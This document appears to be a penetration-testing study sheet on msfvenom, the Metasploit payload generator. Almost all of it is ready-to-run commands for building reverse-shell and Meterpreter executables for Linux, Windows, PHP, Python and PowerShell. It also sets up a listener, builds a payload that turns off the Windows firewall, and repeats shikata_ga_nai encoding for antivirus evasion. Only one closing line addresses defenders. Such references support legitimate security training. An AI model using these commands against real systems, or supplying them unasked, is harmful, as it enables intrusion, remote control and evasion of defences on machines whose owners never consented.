# O.R. 5.3 - MSF Venom Quick Guide

## Overview

- **msfvenom** – payload generator from the Metasploit Framework.
- Used to create custom payloads for various platforms (Linux, Windows, PHP, Python, etc.).
- Supports **staged** and **inline** payloads, encoding, and multiple output formats.
- **Staged payloads** – smaller initial stager downloads the main payload (e.g., `meterpreter/reverse_tcp`).
- **Inline payloads** – self-contained payload (e.g., `meterpreter_reverse_tcp`).

> **Note:** Always set up a listener (`exploit/multi/handler`) before executing the payload.

---

## Metasploit Listener (Handler)

### Standard Handler Setup

```bash
msfconsole
use exploit/multi/handler
set payload linux/x86/meterpreter/reverse_tcp  # or windows/meterpreter/reverse_tcp
set LHOST <YourIP>
set LPORT <YourPort>
exploit
```

---

## Linux Payloads

### Meterpreter Reverse Shell – Staged

| Architecture | Command |
|--------------|---------|
| **x86** | `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=YourIP LPORT=YourPort -f elf > ms_x86.elf` |
| **x64** | `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=YourIP LPORT=YourPort -f elf > ms_x64.elf` |

### Meterpreter Reverse Shell – Inline

| Architecture | Command |
|--------------|---------|
| **x86** | `msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=YourIP LPORT=YourPort -f elf > mi_x86.elf` |
| **x64** | `msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=YourIP LPORT=YourPort -f elf > mi_x64.elf` |

> **Staged vs Inline:** Staged payloads are smaller but require a stager to download the full payload. Inline payloads are self-contained and run independently.

---

## Windows Payloads

### Meterpreter Reverse Shell – Staged

| Architecture | Command |
|--------------|---------|
| **x86** | `msfvenom -p windows/meterpreter/reverse_tcp LHOST=YourIP LPORT=YourPort -f exe > ms_x86.exe` |
| **x64** | `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=YourIP LPORT=YourPort -f exe > ms_x64.exe` |

### Meterpreter Reverse Shell – Inline

| Architecture | Command |
|--------------|---------|
| **x86** | `msfvenom -p windows/meterpreter_reverse_tcp LHOST=YourIP LPORT=YourPort -f exe > mi_x86.exe` |
| **x64** | `msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=YourIP LPORT=YourPort -f exe > mi_x64.exe` |

---

## Additional Payloads

### PHP & Python

| Payload | Command |
|---------|---------|
| **Exec Perl Reverse Shell within PHP** | `msfvenom -p php/reverse_perl LHOST=YourIP LPORT=YourPort -f raw` |
| **Python Reverse Shell for Unix** | `msfvenom -p cmd/unix/reverse_python LHOST=YourIP LPORT=YourPort -f raw` |

### Windows CMD Reverse Shell (Encoded)

```bash
msfvenom -p windows/shell/reverse_tcp LHOST=YourIP LPORT=YourPort -f exe -e x86/shikata_ga_nai -i 4 > shell-cmd.exe
```

### Windows Command Execution (e.g., Disable Firewall)

```bash
msfvenom -f exe -p windows/exec CMD="netsh advfirewall set allprofiles state off" -o command.exe
```

### Windows PowerShell Reverse Shell

```bash
msfvenom -p windows/powershell_reverse_tcp LHOST=YourIP LPORT=YourPort -f raw
```

### Windows Reverse Shell – C# Shellcode

```bash
msfvenom -p windows/shell/reverse_tcp LHOST=YourIP LPORT=YourPort -f csharp
```

### Windows VBS Bind Shell

```bash
msfvenom -p windows/shell/bind_tcp LHOST=YourIP LPORT=YourPort -f vbs -o shell.vbs
```

### Windows VNC Viewer (Remote Desktop)

```bash
msfvenom -p windows/vncinject/reverse_tcp LHOST=YourIP LPORT=YourPort -f exe > vnc.exe
```

---

## Usage Tips

### List Payloads and Options

```bash
msfvenom --list payloads
msfvenom -p windows/meterpreter/reverse_tcp --payload-options
```

### List Encoders

```bash
msfvenom --list encoders
```

> **Note:** If `x86/shikata_ga_nai` throws an error due to bad characters, try another encoder from the list.

### List Output Formats

```bash
msfvenom --list formats
```

### Output Formats

| Type | Description | Examples |
|------|-------------|----------|
| **Executable** | Standalone file with extension (.exe, .elf, .py, .php) | Upload and execute on target |
| **Transform** | Raw shellcode for embedding in exploits | `-f csharp`, `-f js_le`, `-f python` |

**Example: JavaScript Little Endian**

```bash
msfvenom -p windows/shell/reverse_tcp LHOST=YourIP LPORT=YourPort -f js_le
```

---

## Quick Reference

### Common Payloads Cheat Sheet

| Platform | Payload | Format |
|----------|---------|--------|
| Linux x86 Staged | `linux/x86/meterpreter/reverse_tcp` | `elf` |
| Linux x64 Staged | `linux/x64/meterpreter/reverse_tcp` | `elf` |
| Windows x86 Staged | `windows/meterpreter/reverse_tcp` | `exe` |
| Windows x64 Staged | `windows/x64/meterpreter/reverse_tcp` | `exe` |
| Windows CMD Shell | `windows/shell/reverse_tcp` | `exe` |
| PHP | `php/reverse_perl` | `raw` |
| Python | `cmd/unix/reverse_python` | `raw` |
| PowerShell | `windows/powershell_reverse_tcp` | `raw` |
| VNC Inject | `windows/vncinject/reverse_tcp` | `exe` |

### Encoding Examples

```bash
# Single encoder
msfvenom -p windows/shell/reverse_tcp LHOST=YourIP LPORT=YourPort -e x86/shikata_ga_nai -f exe -o encoded.exe

# Multiple iterations (better evasion)
msfvenom -p windows/shell/reverse_tcp LHOST=YourIP LPORT=YourPort -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe
```

---

## Key Takeaways

- **msfvenom** combines `msfpayload` and `msfencode` – one tool for all payload generation.
- **Staged payloads** are smaller but require a second stage; **inline** are self-contained.
- Always **test your payload** in a lab before deployment.
- **Encoders** (e.g., `shikata_ga_nai`) help evade AV detection but are not foolproof.
- Use **multiple encoding iterations** (`-i 5`) for better evasion.
- Match the **payload architecture** to the target (x86 vs x64).
- **Handler** must use the exact same payload type and options as the generated payload.
- **Formats** depend on the delivery method – executable for direct execution, raw shellcode for embedding in exploits.
- **Defender mindset:** Monitor for suspicious executables, encoded PowerShell, and outbound connections on non-standard ports.